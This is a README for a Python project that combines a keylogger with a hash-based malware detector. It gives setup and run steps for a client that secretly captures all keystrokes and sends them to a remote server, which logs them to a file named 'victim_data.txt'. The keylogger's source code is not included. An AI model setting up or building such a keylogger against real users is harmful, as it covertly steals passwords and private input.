# Keylogger Project And Simple Malware Detector

This project implements a simple keylogger that captures keystrokes from a client machine and sends them to a server for logging purposes. It utilizes Python for scripting, `pynput` library for capturing keystrokes, and `socket` library for network communication.

## Features

- **Keylogging:** Captures all keystrokes made on the client machine.
- **Network Communication:** Sends captured keystrokes over the network to a remote server.
- **Logging:** Logs keystrokes into a text file on the server.


### Malware Detector
The malware detector script analyzes files extracted from a specified archive. It calculates cryptographic hashes of files using various hashing algorithms (MD5, SHA-1, SHA-224, SHA-256, SHA3-384, SHA3-512) and compares them against a list of known malicious hashes. If a match is found, it identifies the file as potentially malicious.


## Requirements

- Python 3.x
- `pynput` library (for capturing keystrokes)
- Basic understanding of network sockets
  - `pathlib`: For handling file paths and directories.
  - `shutil`: For unpacking archives.
  - `rarfile` (optional): For handling RAR archives.
  - `hashlib`: For calculating file hashes using various algorithms.

## Installation and Setup

1. **Clone the repository:**

    ```bash
    git clone https://github.com/Oxshady/Keylogger--_-.git
    cd keylogger
    ```

2. **Install dependencies:**

    ```bash
    pip install pynput
    ```

## Usage

### Setting up the Server

1. **Run the server script:**

    ```bash
    python server.py
    ```

    This script starts the server, listens for incoming connections, and logs keystrokes received from clients into a file (`./victim_data.txt`).

### Running the Keylogger Client

1. **Configure the Keylogger Client:**

    Modify `client.py` with the IP address and port of your server:

    ```python
    ke = Keylogger("server_ip", "port")  # Replace with your server's IP and port
    ```

2. **Run the keylogger client script:**

    ```bash
    python client.py
    ```

    This script connects to the specified server and starts capturing keystrokes. All captured keystrokes are sent to the server for logging.

## Troubleshooting

- **Connection Issues:** Ensure the server and client are running on the same network or have proper network access.
- **File Permissions:** Ensure the server has write permissions for the `./victim_data.txt` file in the project directory.

## Acknowledgments

- Thanks to the developers of `pynput` and `socket` libraries for their contributions.
